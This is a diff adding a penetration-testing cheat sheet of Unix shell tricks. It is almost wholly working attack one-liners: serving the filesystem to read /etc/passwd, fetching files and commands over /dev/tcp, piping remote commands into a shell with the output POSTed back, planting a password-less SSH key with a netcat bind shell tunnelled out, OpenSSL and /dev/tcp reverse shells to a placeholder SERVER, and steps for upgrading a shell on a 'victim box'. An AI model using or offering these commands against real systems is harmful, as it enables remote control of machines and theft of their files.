@@ -1,0 +1,132 @@
+Other shell tricks
+=======================================================
+NOTE:
+  -: $SHELL is a env variable. You can use it as is in most cases ;)
+
+* HTTP server (read files)
+----------------------------
+
+    [client]$ cd / && python -m SimpleHTTPServer 8080
+    [server]# curl http://HOST:8080/etc/passwd
+
+
+* Downloading files
+-----------------------------
+    -: perl-libwww-perl
+
+        [client]$ GET http://SERVER/file.sh > file.out
+        [client]$ echo|POST http://SERVER/path > file.out
+
+    -: shell using /dev/tcp
+
+        [server]# nc -vlp 12345 -w 3 < some.file
+        [client]$ exec 3<> /dev/tcp/SERVER/PORT; cat <&3 > /tmp/out.file
+
+    -: HTTP GET
+
+        [client]$ exec 3<> /dev/tcp/SERVER/80; printf "GET /file.name HTTP/1.0\r\n\r\n" >&3; cat <&3 > /tmp/out.file
+        [client]$ expect -c 'spawn telnet SERVER 80; expect -re "Escape character is '^]'."; send "GET /file.name HTTP/1.0\r\n\r\n"; interact' > /tmp/out.file
+
+
+* perl-libwww-perl
+-----------------------------
+   -: If perl-libwww-perl is installed you can use GET and POST commands
+      /usr/bin/GET
+      /usr/bin/POST
+
+   -: Commands are executed after ^C exit, command output will be sent to POST SERVER:PORT
+
+      [server]# nc -vl CMDP // cmd port
+        or
+      [server]# nc -vl CMDP < cmds.txt // cmd port, send commands in bulk
+      [server]# nc -vl COUT // cmd output port
+
+      [client]$ GET http://SERVER:CMDP | $SHELL | POST http://SERVER:COUT
+
+
+* Using bindshell with SSH Tunnel
+----------------------------
+    -: If the remote host is running an SSH daemon
+    -: Port forwarding is enabled
+    -: Script it, client download?
+
+     # Create a password-less ssh key (client will not need a pasword)
+     [server]# ssh-keygen -t rsa -N '' -f id_rsa
+     [server]# cat id_rsa.pub >> ~/.ssh/authorized_keys && chmod 600 ~/.ssh/authorized_keys
+
+     # Find a way to get the ssh key (and/or bind shell?) installed on client
+     [client]$ curl http://SERVER:PORT/id_rsa -o /tmp/id_rsa && chmoe 600 /tmp/id_rsa
+
+     # create a bind shell, enable ssh tunnel
+     [client]$ mkfifo /tmp/mypipe; cat /tmp/mypipe| /bin/bash 2>&1|nc -vl 6000 >/tmp/mypipe // Or some other bind shell
+     [client]$ ssh -o StrictHostKeyChecking=no -o UserKnownHostsFile=/dev/null -i /tmp/id_rsa -R 6000:127.0.0.1:6000 root@SERVER_IP
+
+     # Connect to bind shell The connection to 127.0.0.1 on TCP port 6000 is actually forwarded by SSH to the remote machine
+     # Note exiting the netcat session, the bind shell may exit on the remote machine
+     [server]# ncat 127.0.0.1 6000
+
+
+* OpenSSL
+----------------------------
+
+     [server]# ncat --ssl -vl $PORT
+      or
+     [server]# openssl req -x509 -newkey rsa:4096 -keyout key.pem -out cert.pem -days 365 -nodes -subj "/C=GB/ST=London/L=London/O=Security/OU=LLC/CN=rshell.com"
+     [server]# openssl s_server -quiet -key key.pem -cert cert.pem -port $PORT
+
+     [client]$ mkfifo /tmp/s; /bin/sh -i < /tmp/s 2>&1 | openssl s_client -quiet -connect $SERVER:$PORT > /tmp/s
+      or
+     [client]$ openssl s_client -quiet -connect $SERVER:$PORT < /tmp/s | sh > /tmp/s
+
+   -: HTTPs Server (read files)
+
+        [client]$ cd /tmp && openssl req -x509 -newkey rsa:4096 -keyout key.pem -out cert.pem -days 365 -nodes -subj "/C=GB/ST=London/L=London/O=Security/OU=LLC/CN=rshell.com"
+        [client]$ cd / &&  openssl s_server -key /tmp/key.pem -cert /tmp/cert.pem -port $PORT -HTTP
+
+        [server]# wget --no-check-certificate https://$SERVER:$PORT/etc/passwd -O-
+
+* Blind Reverse Shells
+---------------------------
+
+    [client]$ { nc SERVER PORT < /dev/fd/3 | sh 3>&-; } 3>&1
+    [client]$ exec 5<>/dev/tcp/SERVER/PORT cat <&5 | while read line; do $line 2>&5 >&5; done # or: while read line 0<&5; do $line 2>&5 >&5; done
+
+* Other, Other
+--------------------------
+
+    exec 5<>/dev/tcp/SERVER/PORT; cat <&5 | while read line; do $line 2>&5 >&5; done
+    exec /bin/sh 0</dev/tcp/SERVER/PORT 1>&0 2>&0
+    0<&196;exec 196<>/dev/tcp/SERVER/PORT; sh <&196 >&196 2>&196
+
+
+* Pretty shell? *meh*
+--------------------------
+
+  -: Upgrading Reverse Shells to be Fully Interactive
+     Reference: https://medium.com/@hakluke/haklukes-ultimate-oscp-guide-part-3-practical-hacking-tips-and-tricks-c38486f5fc97
+
+     Popping a reverse shell is exciting, but it’s not quite the same as a fully interactive shell. You won’t have tab completion,
+     you can’t run any interactive programs (including sudo), and if you press Ctrl+C, you will exit back to your local box, which
+     sucks. So! Here’s how to upgrade your Linux reverse shell:
+
+	python -c "import pty; pty.spawn('/bin/bash')"
+
+     You should get a nicer looking prompt, but your job isn’t over yet. Press Ctrl+Z to background your reverse shell, then in
+     your local machine run:
+
+	stty raw -echo
+	fg
+
+     Things are going to look really messed up at this point, but don’t worry. Just type reset and hit return. You should be presented with
+     a fully interactive shell. You’re welcome.
+
+     There’s still one little thing that can happen, the shell might not be the correct height/width for your terminal. To fix this,
+     go to your local machine and run:
+
+	stty size
+
+      This should return two numbers, which are the number of rows and columns in your terminal. For example’s sake let’s say this
+      command returned 48 120 Head on back to your victim box’s shell and run the following:
+
+	stty -rows 48 -columns 120
+
